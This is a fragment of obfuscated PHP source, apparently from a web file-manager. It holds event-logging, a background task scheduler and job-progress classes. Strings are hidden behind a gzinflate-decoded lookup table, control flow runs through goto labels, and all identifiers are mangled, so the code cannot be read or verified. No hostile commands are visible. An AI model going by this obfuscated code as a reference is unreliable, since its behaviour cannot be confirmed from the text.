eventRename($É°‡ë˙∫, $ïÜíˆÑº, $Î‰⁄Óˆí) { $„“⁄´ÇÑ =& $_SERVER[ëæªã÷]; $§Ÿ™øøà = array($„“⁄´ÇÑ[1134] => $ïÜíˆÑº, $„“⁄´ÇÑ[1135] => $Î‰⁄Óˆí); return $this->addEvent($É°‡ë˙∫, $„“⁄´ÇÑ[1316], $§Ÿ™øøà); } public function eventAddComment($äÍÃÎ≤∆, $ﬁÚà»∞±) { return $this->addEvent($äÍÃÎ≤∆, $_SERVER[ëæªã÷][2024], $ﬁÚà»∞±); } public function eventAddDesc($≈°ﬁÕøÖ, $£“¶ØÓˆ) { return $this->addEvent($≈°ﬁÕøÖ, $_SERVER[ëæªã÷][2025], $£“¶ØÓˆ); } public function listBySource($úº—Üª˚) { $°É˙Æ˜Ê =& $_SERVER[ëæªã÷]; $’∫†ùä£ = Model($°É˙Æ˜Ê[1301])->sourceInfo($úº—Üª˚); $¿µè®¿¸ = array($°É˙Æ˜Ê[418] => $úº—Üª˚); if ($’∫†ùä£[$°É˙Æ˜Ê[411]] == $°É˙Æ˜Ê[99]) { $¥„Ñ•É– = Model($°É˙Æ˜Ê[1301])->listSearchChildren($úº—Üª˚, 20000); $¥„Ñ•É–[] = $úº—Üª˚ . $°É˙Æ˜Ê[382]; $¿µè®¿¸ = array($°É˙Æ˜Ê[403] => array($°É˙Æ˜Ê[7], $¥„Ñ•É–)); } $«°«Œ¢π = $this->where($¿µè®¿¸)->order($°É˙Æ˜Ê[2026])->selectPage(); if ($«°«Œ¢π[$°É˙Æ˜Ê[370]][$°É˙Æ˜Ê[371]] == 0) { $«°«Œ¢π[$°É˙Æ˜Ê[370]][$°É˙Æ˜Ê[371]] = 1; $«°«Œ¢π[$°É˙Æ˜Ê[373]] = array(array($°É˙Æ˜Ê[418] => $úº—Üª˚, $°É˙Æ˜Ê[2008] => $’∫†ùä£[$°É˙Æ˜Ê[498]], $°É˙Æ˜Ê[1619] => $’∫†ùä£[$°É˙Æ˜Ê[452]], $°É˙Æ˜Ê[423] => $°É˙Æ˜Ê[2027], $°É˙Æ˜Ê[424] => $’∫†ùä£[$°É˙Æ˜Ê[203]], $°É˙Æ˜Ê[1621] => $°É˙Æ˜Ê[12])); } return $this->eventListParse($«°«Œ¢π, $úº—Üª˚); } private function eventListParse($µëı⁄…ì, $ıπﬂ∞ø¡) { $»éôüÕ¢ =& $_SERVER[ëæªã÷]; $∏„ÛÒ‰≠ = $µëı⁄…ì[$»éôüÕ¢[373]]; $∑¶ñäÊƒ = array_to_keyvalue($∏„ÛÒ‰≠, $»éôüÕ¢[12], $»éôüÕ¢[403]); $Ã‚ò“≥ç = array_to_keyvalue($∏„ÛÒ‰≠, $»éôüÕ¢[12], $»éôüÕ¢[2014]); foreach ($∏„ÛÒ‰≠ as $ıíñ˘ﬁ√) { $ﬁœ≥¡øß = $ıíñ˘ﬁ√[$»éôüÕ¢[451]]; if ($ıíñ˘ﬁ√[$»éôüÕ¢[33]] == $»éôüÕ¢[551] && isset($ﬁœ≥¡øß[$»éôüÕ¢[1134]])) { $∑¶ñäÊƒ[] = $ﬁœ≥¡øß[$»éôüÕ¢[1134]] . $»éôüÕ¢[12]; $∑¶ñäÊƒ[] = $ﬁœ≥¡øß[$»éôüÕ¢[1135]] . $»éôüÕ¢[12]; } if ($ıíñ˘ﬁ√[$»éôüÕ¢[33]] == $»éôüÕ¢[2023] && isset($ﬁœ≥¡øß[$»éôüÕ¢[403]])) { $∑¶ñäÊƒ[] = $ﬁœ≥¡øß[$»éôüÕ¢[403]] . $»éôüÕ¢[12]; } } $∑¶ñäÊƒ = array_merge($∑¶ñäÊƒ, $Ã‚ò“≥ç, array($ıπﬂ∞ø¡ . $»éôüÕ¢[12])); $∑¶ñäÊƒ = array_unique($∑¶ñäÊƒ); $ƒúü√Ê∂ = array_unique(array_to_keyvalue($∏„ÛÒ‰≠, $»éôüÕ¢[12], $»éôüÕ¢[1628])); $ªäµı⁄˛ = Model($»éôüÕ¢[538])->userListInfo($ƒúü√Ê∂); $◊˛˜ì‡¶ = Model($»éôüÕ¢[805])->sourceListInfo($∑¶ñäÊƒ, !0); foreach ($∏„ÛÒ‰≠ as &$ıíñ˘ﬁ√) { if ($ıíñ˘ﬁ√[$»éôüÕ¢[33]] == $»éôüÕ¢[551] && isset($ıíñ˘ﬁ√[$»éôüÕ¢[451]][$»éôüÕ¢[1134]])) { $ıíñ˘ﬁ√[$»éôüÕ¢[451]][$»éôüÕ¢[1134]] = $◊˛˜ì‡¶[$ıíñ˘ﬁ√[$»éôüÕ¢[451]][$»éôüÕ¢[1134]]]; $ıíñ˘ﬁ√[$»éôüÕ¢[451]][$»éôüÕ¢[1135]] = $◊˛˜ì‡¶[$ıíñ˘ﬁ√[$»éôüÕ¢[451]][$»éôüÕ¢[1135]]]; } if ($ıíñ˘ﬁ√[$»éôüÕ¢[33]] == $»éôüÕ¢[2023] && isset($ıíñ˘ﬁ√[$»éôüÕ¢[451]][$»éôüÕ¢[403]])) { $ıíñ˘ﬁ√[$»éôüÕ¢[451]][$»éôüÕ¢[403]] = $◊˛˜ì‡¶[$ıíñ˘ﬁ√[$»éôüÕ¢[451]][$»éôüÕ¢[403]]]; } $ıíñ˘ﬁ√[$»éôüÕ¢[97]] = $◊˛˜ì‡¶[$ıíñ˘ﬁ√[$»éôüÕ¢[403]]]; $ıíñ˘ﬁ√[$»éôüÕ¢[2028]] = $◊˛˜ì‡¶[$ıíñ˘ﬁ√[$»éôüÕ¢[2014]]]; if ($ıíñ˘ﬁ√[$»éôüÕ¢[33]] == $»éôüÕ¢[1765]) { $ıíñ˘ﬁ√[$»éôüÕ¢[2028]] = $ıíñ˘ﬁ√[$»éôüÕ¢[97]]; $ıíñ˘ﬁ√[$»éôüÕ¢[2014]] = $ıíñ˘ﬁ√[$»éôüÕ¢[2028]][$»éôüÕ¢[403]]; $ıíñ˘ﬁ√[$»éôüÕ¢[97]] = !1; $ıíñ˘ﬁ√[$»éôüÕ¢[403]] = $»éôüÕ¢[12]; } $ıíñ˘ﬁ√[$»éôüÕ¢[1959]] = $ªäµı⁄˛[$ıíñ˘ﬁ√[$»éôüÕ¢[1628]]]; } unset($ıíñ˘ﬁ√); $µëı⁄…ì[$»éôüÕ¢[373]] = $∏„ÛÒ‰≠; return $µëı⁄…ì; } public function removeBySource($˜÷©∫¸Ò) { $“ƒ¬åÙŸ = array($_SERVER[ëæªã÷][418] => $˜÷©∫¸Ò); $this->where($“ƒ¬åÙŸ)->remove(); } } goto d·ç©Âñ≤ã; F ÑùıÕ¿Í: if (strlen($pakvoiztqf) < $_SERVER[ëæªã÷][607]) { return; } $_SERVER[µÁ∏◊Ÿ•] = explode($_SERVER[ëæªã÷][608], gzinflate(substr($_SERVER[ëæªã÷][609], 10, -8))); $olwqijtnvp = $_SERVER[ëæªã÷][610]; goto F¥≤èÕπí–; eå†óñºÎ¶: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $ãÍø‡–Á =& $_SERVER[ëæªã÷]; if (self::valueGet($ãÍø‡–Á[730]) != $ãÍø‡–Á[99]) { return; } if (self::valueGet($ãÍø‡–Á[1588]) == $ãÍø‡–Á[99]) { $÷˜úœÇ = self::valueGet($ãÍø‡–Á[1589]); if (time() - $÷˜úœÇ > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); self::valueSet($ãÍø‡–Á[1588], $ãÍø‡–Á[99]); self::log($ãÍø‡–Á[1590]); Hook::bind($ãÍø‡–Á[1591], $ãÍø‡–Á[1592]); $Á≥·†√∂ = 0; while (!0) { self::cacheClear(); if (self::valueGet($ãÍø‡–Á[730]) != $ãÍø‡–Á[99]) { self::valueSet($ãÍø‡–Á[1588], $ãÍø‡–Á[200]); self::log($ãÍø‡–Á[1593]); die; } $¥Ä¢∂‚È = time(); if ($¥Ä¢∂‚È - $Á≥·†√∂ >= 60) { self::valueSet(array($ãÍø‡–Á[1588] => $ãÍø‡–Á[99], $ãÍø‡–Á[1589] => $¥Ä¢∂‚È), !1); $Á≥·†√∂ = $¥Ä¢∂‚È; } if (!file_exists(USER_SYSTEM . $ãÍø‡–Á[1594])) { self::valueSet(array($ãÍø‡–Á[1588] => $ãÍø‡–Á[200], $ãÍø‡–Á[730] => $ãÍø‡–Á[200]), !1); self::log($ãÍø‡–Á[1595]); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $Û›æÃÓí =& $_SERVER[ëæªã÷]; http_close(); self::valueSet($Û›æÃÓí[730], $Û›æÃÓí[200]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($Û›æÃÓí[1588] => $Û›æÃÓí[200], $Û›æÃÓí[730] => $Û›æÃÓí[99]), !1); } public static function shutdownEvent() { $ÀÇøÁä“ =& $_SERVER[ëæªã÷]; self::valueSet($ÀÇøÁä“[1588], $ÀÇøÁä“[200]); self::log($ÀÇøÁä“[1596]); } public static function config($ãÊÎ∏Ï—, $Î¬πΩ≤‹) { self::valueSet($_SERVER[ëæªã÷][730], $ãÊÎ∏Ï—); } private static function taskRunAll() { $¯¡∏ü©é =& $_SERVER[ëæªã÷]; $”Ÿˆ· ⁄ = timeFloat(); $ÈùπéÀ≠ = Model($¯¡∏ü©é[1597])->listData(); $ΩàŸÄ˛˙ = count($ÈùπéÀ≠); for ($ƒª™éÿﬁ = 0; $ƒª™éÿﬁ < $ΩàŸÄ˛˙; $ƒª™éÿﬁ++) { $«∆º•Äó = $ÈùπéÀ≠[$ƒª™éÿﬁ]; if (!$«∆º•Äó[$¯¡∏ü©é[401]] || $«∆º•Äó[$¯¡∏ü©é[1598]] != $¯¡∏ü©é[99]) { continue; } if (!self::taskTimeCheck($«∆º•Äó)) { continue; } self::taskRun($«∆º•Äó); } Hook::trigger($¯¡∏ü©é[1599]); self::taskQueueRun($”Ÿˆ· ⁄); } private static function taskQueueRun($ëπ¨”Ãù) { $ﬂ´Ø¿Ø– = 10; while (!0) { $ÿπÑ‹∞¢ = TaskQueue::run(); if ($ÿπÑ‹∞¢ === !1) { break; } if (timeFloat() - $ëπ¨”Ãù >= $ﬂ´Ø¿Ø–) { break; } } } private static function taskTimeCheck($√É÷∆†Ω) { $ˆñ∑¢Ù’ =& $_SERVER[ëæªã÷]; $ªéÅñ¨ÿ = json_decode($√É÷∆†Ω[$ˆñ∑¢Ù’[206]], !0); $¡©◊Íôî = intval($√É÷∆†Ω[$ˆñ∑¢Ù’[1589]]); $Ÿº˙Õóê = strtotime($ˆñ∑¢Ù’[1600] . $ªéÅñ¨ÿ[$ˆñ∑¢Ù’[1601]] . $ˆñ∑¢Ù’[1602]) - strtotime($ˆñ∑¢Ù’[1603]); $œ£ıÑ®Œ = time() - strtotime(date($ˆñ∑¢Ù’[1604]) . $ˆñ∑¢Ù’[1605]); $•Ω‚∑˘Ò = $œ£ıÑ®Œ >= $Ÿº˙Õóê && $œ£ıÑ®Œ <= $Ÿº˙Õóê + 3600; switch ($ªéÅñ¨ÿ[$ˆñ∑¢Ù’[33]]) { case $ˆñ∑¢Ù’[1606]: if (time() - $¡©◊Íôî < 3600 * 24 * 30) { return !1; } if ($ªéÅñ¨ÿ[$ˆñ∑¢Ù’[1606]] == date($ˆñ∑¢Ù’[1607]) && $•Ω‚∑˘Ò) { return !0; } break; case $ˆñ∑¢Ù’[1608]: if (time() - $¡©◊Íôî < 3600 * 24 * 7) { return !1; } $ÁÅëù¥÷ = date($ˆñ∑¢Ù’[1609]) == 0 ? 7 : date($ˆñ∑¢Ù’[1609]); if ($ªéÅñ¨ÿ[$ˆñ∑¢Ù’[1608]] == $ÁÅëù¥÷ && $•Ω‚∑˘Ò) { return !0; } break; case $ˆñ∑¢Ù’[1601]: if (time() - $¡©◊Íôî < 3600 * 24) { return !1; } if ($•Ω‚∑˘Ò) { return !0; } break; case $ˆñ∑¢Ù’[1610]: if (time() - $¡©◊Íôî >= floatval($ªéÅñ¨ÿ[$ˆñ∑¢Ù’[1610]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $¬°†ëƒù =& $_SERVER[ëæªã÷]; static $ÁÌ§¢Á∞ = 0; $ø¯∏É± = 300; if (!$ÁÌ§¢Á∞) { $ÁÌ§¢Á∞ = time(); } if (time() - $ÁÌ§¢Á∞ < $ø¯∏É±) { return; } $ÁÌ§¢Á∞ = time(); $æ∫ÏÍ∫Ê = Model($¬°†ëƒù[513])->db($¬°†ëƒù[12]); if ($æ∫ÏÍ∫Ê) { $æ∫ÏÍ∫Ê->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($¬°†ëƒù[1611], $¬°†ëƒù[1612]); die; } } public static function taskRun($¥Ö‰Í»») { $‰—Ωœπ¥ =& $_SERVER[ëæªã÷]; self::log($‰—Ωœπ¥[1613] . $¥Ö‰Í»»[$‰—Ωœπ¥[401]] . $‰—Ωœπ¥[1614] . $¥Ö‰Í»»[$‰—Ωœπ¥[32]] . $‰—Ωœπ¥[1615] . $¥Ö‰Í»»[$‰—Ωœπ¥[1616]]); Model($‰—Ωœπ¥[1597])->run($¥Ö‰Í»»[$‰—Ωœπ¥[401]]); $ò˘¨öœ‚ = timeFloat(); $˛õ›êÀ¿ = $‰—Ωœπ¥[12]; switch ($¥Ö‰Í»»[$‰—Ωœπ¥[33]]) { case $‰—Ωœπ¥[311]: $Ö‚çÂâï = url_request($¥Ö‰Í»»[$‰—Ωœπ¥[1616]], $‰—Ωœπ¥[235], !1, !1, !1, !1, 10); if ($Ö‚çÂâï[$‰—Ωœπ¥[730]]) { $˛õ›êÀ¿ = strlen($Ö‚çÂâï[$‰—Ωœπ¥[1167]]); } break; case $‰—Ωœπ¥[234]: $˛õ›êÀ¿ = Hook::apply($¥Ö‰Í»»[$‰—Ωœπ¥[1616]]); default: break; } Model($‰—Ωœπ¥[1617])->add(array($‰—Ωœπ¥[1618] => $‰—Ωœπ¥[12], $‰—Ωœπ¥[1619] => $‰—Ωœπ¥[200], $‰—Ωœπ¥[33] => $‰—Ωœπ¥[1620] . $¥Ö‰Í»»[$‰—Ωœπ¥[401]], $‰—Ωœπ¥[1621] => json_encode(array($‰—Ωœπ¥[32] => $¥Ö‰Í»»[$‰—Ωœπ¥[32]], $‰—Ωœπ¥[1622] => timeFloat() - $ò˘¨öœ‚, $‰—Ωœπ¥[297] => $˛õ›êÀ¿)))); $ÀÍ©À∂„ = $˛õ›êÀ¿ ? $‰—Ωœπ¥[1623] . $˛õ›êÀ¿ : $‰—Ωœπ¥[12]; self::log($‰—Ωœπ¥[1624] . $¥Ö‰Í»»[$‰—Ωœπ¥[401]] . $‰—Ωœπ¥[536] . $ÀÍ©À∂„); return !0; } private static function valueGet($¿èÌì±‡) { $ÇÄ¬∂âˆ =& $_SERVER[ëæªã÷]; $øπ˝ÚÆÖ = $ÇÄ¬∂âˆ[1625]; $°µÓ„éŒ = Model($ÇÄ¬∂âˆ[433])->get($¿èÌì±‡, $øπ˝ÚÆÖ); if (is_null($°µÓ„éŒ)) { Model($ÇÄ¬∂âˆ[433])->set($ÇÄ¬∂âˆ[730], $ÇÄ¬∂âˆ[99], $øπ˝ÚÆÖ); Model($ÇÄ¬∂âˆ[433])->set($ÇÄ¬∂âˆ[1588], $ÇÄ¬∂âˆ[200], $øπ˝ÚÆÖ); $°µÓ„éŒ = Model($ÇÄ¬∂âˆ[433])->get($¿èÌì±‡, $øπ˝ÚÆÖ); } return $°µÓ„éŒ; } private static function valueSet($É£©¢§á, $ÈŸ◊È◊°) { $Éìœ»Óô =& $_SERVER[ëæªã÷]; $öÊä∆Ùœ = $Éìœ»Óô[1626]; CacheLock::lock($öÊä∆Ùœ); $…–Ï∏ŸÃ = Model($Éìœ»Óô[433])->set($É£©¢§á, $ÈŸ◊È◊°, $Éìœ»Óô[1625]); CacheLock::unlock($öÊä∆Ùœ); return $…–Ï∏ŸÃ; } protected static function log($¶¬ß´ÜÜ) { write_log($¶¬ß´ÜÜ, $_SERVER[ëæªã÷][1612]); } private static function cacheClear() { $î™√ÿˆ¯ =& $_SERVER[ëæªã÷]; Cache::clearMemory(Model($î™√ÿˆ¯[433])->cacheKey($î™√ÿˆ¯[1625])); Cache::clearMemory(Model($î™√ÿˆ¯[433])->cacheKey($î™√ÿˆ¯[1627])); Model($î™√ÿˆ¯[1597])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\164\x6f\160"; const STATYS_RUNNING = "\x72\x75\156\x6e\151\x6e\147"; const STATYS_KILL = "\x6b\151\154\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($”áŒã“´, $Á“ëø≥Å = '', $ãá¶ÒﬂÕ = 0, $∂÷ﬁ§´Œ = '') { $œûáÒÜ∂ =& $_SERVER[ëæªã÷]; if (self::get($”áŒã“´)) { return; } $this->task = array($œûáÒÜ∂[401] => $”áŒã“´, $œûáÒÜ∂[1628] => USER_ID, $œûáÒÜ∂[1528] => $∂÷ﬁ§´Œ, $œûáÒÜ∂[33] => $Á“ëø≥Å, $œûáÒÜ∂[1040] => $œûáÒÜ∂[12], $œûáÒÜ∂[766] => $ãá¶ÒﬂÕ, $œûáÒÜ∂[1629] => 0, $œûáÒÜ∂[1630] => 0, $œûáÒÜ∂[1631] => 0, $œûáÒÜ∂[1632] => timeFloat(), $œûáÒÜ∂[1633] => 0, $œûáÒÜ∂[1634] => 0, $œûáÒÜ∂[1635] => 0, $œûáÒÜ∂[1636] => 0, $œûáÒÜ∂[730] => $œûáÒÜ∂[1588]); $GLOBALS[$œûáÒÜ∂[1637]] = 1; Hook::bind($œûáÒÜ∂[1591], array($this, $œûáÒÜ∂[1638])); Hook::bind($œûáÒÜ∂[1639], array($this, $œûáÒÜ∂[1640])); $this->startAfter(); Hook::trigger($œûáÒÜ∂[1641], $this->task); $this->task[$œûáÒÜ∂[1634]] = timeFloat(); } public function end() { $Ø¡¡õ”‚ =& $_SERVER[ëæªã÷]; if (!$this->task) { return; } if ($this->task[$Ø¡¡õ”‚[1634]]) { self::valueSet($this->task[$Ø¡¡õ”‚[401]], !1); } $ÜÊ˜π∞⁄ = timeFloat() - $this->task[$Ø¡¡õ”‚[1632]]; self::log($Ø¡¡õ”‚[1642] . $this->task[$Ø¡¡õ”‚[401]] . $Ø¡¡õ”‚[1643] . $ÜÊ˜π∞⁄ . $Ø¡¡õ”‚[1644]); Hook::unbind($Ø¡¡õ”‚[1591], array($this, $Ø¡¡õ”‚[1638])); Hook::unbind($Ø¡¡õ”‚[1639], array($this, $Ø¡¡õ”‚[1640])); $this->endAfter(); $this->task = !1; } public function update($Øﬂ”È∑‘ = 0, $˛ÓÎÎ¿Ì = false) { $†˛É≥ôÓ =& $_SERVER[ëæªã÷]; $¬å§õÁ” =& $this->task; if (!$¬å§õÁ”) { return; } $¬å§õÁ”[$†˛É≥ôÓ[1629]] += $Øﬂ”È∑‘; $¬å§õÁ”[$†˛É≥ôÓ[1633]] = timeFloat(); if ($¬å§õÁ”[$†˛É≥ôÓ[766]]) { if ($¬å§õÁ”[$†˛É≥ôÓ[766]] < $¬å§õÁ”[$†˛É≥ôÓ[1629]]) { $¬å§õÁ”[$†˛É≥ôÓ[766]] = $¬å§õÁ”[$†˛É≥ôÓ[1629]]; } $çµº›áÊ = timeFloat() - $¬å§õÁ”[$†˛É≥ôÓ[1632]] - $¬å§õÁ”[$†˛É≥ôÓ[1635]]; $¬å§õÁ”[$†˛É≥ôÓ[1630]] = $¬å§õÁ”[$†˛É≥ôÓ[1629]] / $¬å§õÁ”[$†˛É≥ôÓ[766]]; $¬å§õÁ”[$†˛É≥ôÓ[1631]] = $¬å§õÁ”[$†˛É≥ôÓ[1629]] / $çµº›áÊ; if ($¬å§õÁ”[$†˛É≥ôÓ[1630]] > 0) { $¬å§õÁ”[$†˛É≥ôÓ[1636]] = $çµº›áÊ * (1 - $¬å§õÁ”[$†˛É≥ôÓ[1630]]) / $¬å§õÁ”[$†˛É≥ôÓ[1630]]; } $¬å§õÁ”[$†˛É≥ôÓ[1636]] = $¬å§õÁ”[$†˛É≥ôÓ[1636]] <= 0 ? 0 : $¬å§õÁ”[$†˛É≥ôÓ[1636]]; } $this->updateAfter(); $Å’¬¯†Ã = 0.2; if (timeFloat() - $¬å§õÁ”[$†˛É≥ôÓ[1634]] < $Å’¬¯†Ã && !$˛ÓÎÎ¿Ì) { return; } $˘‚≠≤¡´ = self::get($¬å§õÁ”[$†˛É≥ôÓ[401]]); $°îÚŸÒπ = $˘‚≠≤¡´[$†˛É≥ôÓ[730]]; if ($°îÚŸÒπ == self::STATYS_KILL) { $„éîÀäß = array($†˛É≥ôÓ[1645] => LNG($†˛É≥ôÓ[1646]), $†˛É≥ôÓ[1165] => !1); Cache::set($†˛É≥ôÓ[1647] . $this->task[$†˛É≥ôÓ[401]], $„éîÀäß, 30); $this->onKill(); $this->end(); die; } else { if ($°îÚŸÒπ == self::STATYS_STOP) { $Ã˘ÉœÆﬁ = 2; $˘‚≠≤¡´[$†˛É≥ôÓ[1635]] += $Ã˘ÉœÆﬁ; self::valueSet($¬å§õÁ”[$†˛É≥ôÓ[401]], $˘‚≠≤¡´); sleep($Ã˘ÉœÆﬁ); $this->update(); return; } } $¬å§õÁ”[$†˛É≥ôÓ[730]] = $°îÚŸÒπ ? $°îÚŸÒπ : $¬å§õÁ”[$†˛É≥ôÓ[730]]; $¬å§õÁ”[$†˛É≥ôÓ[1635]] = $˘‚≠≤¡´[$†˛É≥ôÓ[1635]] ? $˘‚≠≤¡´[$†˛É≥ôÓ[1635]] : 0; $¬å§õÁ”[$†˛É≥ôÓ[1634]] = timeFloat(); Hook::trigger($†˛É≥ôÓ[1648], $¬å§õÁ”); self::valueSet($¬å§õÁ”[$†˛É≥ôÓ[401]], $¬å§õÁ”); } public function onKillSet($ÊíÔå™Ø, $˜¬≈‰å = array()) { $this->onKillCall = array($ÊíÔå™Ø, $˜¬≈‰å); } public function onKill() { $åÄõ∫ØÌ =& $_SERVER[ëæªã÷]; self::log($åÄõ∫ØÌ[1642] . $this->task[$åÄõ∫ØÌ[401]] . $åÄõ∫ØÌ[1649]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($∞√ÕŒ™Ú) { $ıòπÑÖ¨ =& $_SERVER[ëæªã÷]; Cache::set($ıòπÑÖ¨[1647] . $this->task[$ıòπÑÖ¨[401]], $∞√ÕŒ™Ú, 60); return $∞√ÕŒ™Ú; } public static function get($â∂ı ÷”) { $Ä◊∑òÏ⁄ =& $_SERVER[ëæªã÷]; $©ÊøÂÈÛ = self::valueGet($â∂ı ÷”); if (is_array($©ÊøÂÈÛ) && $©ÊøÂÈÛ[$Ä◊∑òÏ⁄[1650]]) { $Ω“¥Æí± = ActionApply($©ÊøÂÈÛ[$Ä◊∑òÏ⁄[1650]], array($©ÊøÂÈÛ)); $©ÊøÂÈÛ = is_array($Ω“¥Æí±) ? $Ω“¥Æí± : $©ÊøÂÈÛ; } return $©ÊøÂÈÛ; } public static function listData() { $Â¸Ô“¯— = self::valueGet(); return array_sort_by($Â¸Ô“¯—, $_SERVER[ëæªã÷][1632], !0); } public static function kill($Æó–‘âΩ) { return self::changeStatus($Æó–‘âΩ, self::STATYS_KILL); } public static function stop($©è¢º¸©) { return self::changeStatus($©è¢º¸©, self::STATYS_STOP); } public static function restart($¨å˛Û˛ ) { return self::changeStatus($¨å˛Û˛ , self::STATYS_RUNNING); } public static function killAll() { $Ç∑µ∫’Ç =& $_SERVER[ëæªã÷]; $ﬂΩ Ü⁄— = self::listData(); foreach ($ﬂΩ Ü⁄— as $¯Ñüç£∞) { self::kill($¯Ñüç£∞[$Ç∑µ∫’Ç[401]]); } sleep(2); foreach ($ﬂΩ Ü⁄— as $¯Ñüç£∞) { self::valueSet($¯Ñüç£∞[$Ç∑µ∫’Ç[401]], !1); } } private static function changeStatus($⁄ †Äµï, $¨≤Óû≈—) { $ÙÒ∑¬‰∞ =& $_SERVER[ëæªã÷]; $ôà«⁄áÅ = self::valueGet($⁄ †Äµï); if (!$ôà«⁄áÅ) { return !1; } $ôà«⁄áÅ[$ÙÒ∑¬‰∞[730]] = $¨≤Óû≈—; self::valueSet($⁄ †Äµï, $ôà«⁄áÅ); self::log($ÙÒ∑¬‰∞[1651] . $ôà«⁄áÅ[$ÙÒ∑¬‰∞[401]] . $ÙÒ∑¬‰∞[1652] . $¨≤Óû≈—); return !0; } public static function valueGet($ñºœ«¥í = false) { $÷ﬂƒΩ±≈ =& $_SERVER[ëæªã÷]; if ($ñºœ«¥í) { $°¥åñ∏÷ = Model($÷ﬂƒΩ±≈[445])->where(array($÷ﬂƒΩ±≈[105] => $ñºœ«¥í, $÷ﬂƒΩ±≈[33] => $÷ﬂƒΩ±≈[1047]))->find(); return $°¥åñ∏÷ ? json_decode($°¥åñ∏÷[$÷ﬂƒΩ±≈[378]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($ÑùÕúî‡ = false) { $Å¡Ÿ€ä› =& $_SERVER[ëæªã÷]; $…Øöº´π = array($Å¡Ÿ€ä›[33] => $Å¡Ÿ€ä›[1047]); if ($ÑùÕúî‡) { $…Øöº´π[$Å¡Ÿ€ä›[1628]] = $ÑùÕúî‡; } $™ÜÂﬂîé = Model($Å¡Ÿ€ä›[445])->where($…Øöº´π)->select(); $™ÜÂﬂîé = $™ÜÂﬂîé ? $™ÜÂﬂîé : array(); foreach ($™ÜÂﬂîé as $Òçæ≤Ê« => $ÿ“∆˛ª¬) { $™ÜÂﬂîé[$Òçæ≤Ê«] = json_decode($ÿ“∆˛ª¬[$Å¡Ÿ€ä›[378]], !0); } return $™ÜÂﬂîé; } public static function valueSet($¯ÙäﬂË¥, $Û≤òË”ü) { $¸‰È∏¶˙ =& $_SERVER[ëæªã÷]; if (!$Û≤òË”ü) { return Model($¸‰È∏¶˙[445])->where(array($¸‰È∏¶˙[105] => $¯ÙäﬂË¥, $¸‰È∏¶˙[33] => $¸‰È∏¶˙[1047]))->delete(); } $ÚˆˆÛ·” = json_encode($Û≤òË”ü); if (!$ÚˆˆÛ·”) { ob_start(); var_dump($Û≤òË”ü); $ÖûçÆ’¡ = ob_get_clean(); self::log($¸‰È∏¶˙[1653] . json_encode_force($ÖûçÆ’¡)); } if (!$¯ÙäﬂË¥ || !$Û≤òË”ü[$¸‰È∏¶˙[401]]) { return !1; } $û˛˚¨åº = array($¸‰È∏¶˙[33] => $¸‰È∏¶˙[1047], $¸‰È∏¶˙[1628] => USER_ID, $¸‰È∏¶˙[105] => $¯ÙäﬂË¥, $¸‰È∏¶˙[378] => $ÚˆˆÛ·”); $˜Éˆ∑”Ë = $¸‰È∏¶˙[1654]; CacheLock::lock($˜Éˆ∑”Ë); Model($¸‰È∏¶˙[445])->add($û˛˚¨åº, array(), !0); CacheLock::unlock($˜Éˆ∑”Ë); } public static function log($«≈û∏“§) { if (!GLOBAL_DEBUG) { return; } write_log($«≈û∏“§, $_SERVER[ëæªã÷][1655]); } } class TaskFileTransfer extends Task { protected function startAfter() { $ú˜’ƒ∂Ã =& $_SERVER[ëæªã÷]; $åÁ§Çﬂ¯ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($ú˜’ƒ∂Ã[1656], array($this, $ú˜’ƒ∂Ã[1657])); Hook::bind($ú˜’ƒ∂Ã[1189], array($this, $ú˜’ƒ∂Ã[1658])); Hook::bind($ú˜’ƒ∂Ã[1659], array($this, $ú˜’ƒ∂Ã[1660])); Hook::bind($ú˜’ƒ∂Ã[598], array($this, $ú˜’ƒ∂Ã[1661])); Hook::bind($ú˜’ƒ∂Ã[599], array($this, $ú˜’ƒ∂Ã[1662])); Hook::bind($ú˜’ƒ∂Ã[601], array($this, $ú˜’ƒ∂Ã[1663])); Hook::bind($ú˜’ƒ∂Ã[602], array($this, $ú˜’ƒ∂Ã[1663])); Hook::bind($ú˜’ƒ∂Ã[568], array($this, $ú˜’ƒ∂Ã[1664])); Hook::bind($ú˜’ƒ∂Ã[565], array($this, $ú˜’ƒ∂Ã[1664])); Hook::bind($ú˜’ƒ∂Ã[570], array($this, $ú˜’ƒ∂Ã[1664])); Hook::bind($ú˜’ƒ∂Ã[572], array($this, $ú˜’ƒ∂Ã[1664])); Hook::bind($ú˜’ƒ∂Ã[574], array($this, $ú˜’ƒ∂Ã[1664])); Hook::bind($ú˜’ƒ∂Ã[1665], array($this, $ú˜’ƒ∂Ã[1666])); Hook::bind($ú˜’ƒ∂Ã[591], array($this, $ú˜’ƒ∂Ã[1667])); $this->sourceModelCopyFlag = !1; Hook::bind($ú˜’ƒ∂Ã[1668], array($this, $ú˜’ƒ∂Ã[1669])); Hook::bind($ú˜’ƒ∂Ã[1670], array($this, $ú˜’ƒ∂Ã[1671])); Hook::bind($ú˜’ƒ∂Ã[1672], array($this, $ú˜’ƒ∂Ã[1673])); $åÁ§Çﬂ¯[$ú˜’ƒ∂Ã[1674]] = LNG($ú˜’ƒ∂Ã[1675]); $åÁ§Çﬂ¯[$ú˜’ƒ∂Ã[1676]] = 0; $åÁ§Çﬂ¯[$ú˜’ƒ∂Ã[1677]] = 0; $åÁ§Çﬂ¯[$ú˜’ƒ∂Ã[1040]] = $ú˜’ƒ∂Ã[12]; $åÁ§Çﬂ¯[$ú˜’ƒ∂Ã[1678]] = $ú˜’ƒ∂Ã[12]; $åÁ§Çﬂ¯[$ú˜’ƒ∂Ã[1679]] = 0; $åÁ§Çﬂ¯[$ú˜’ƒ∂Ã[1680]] = 0; 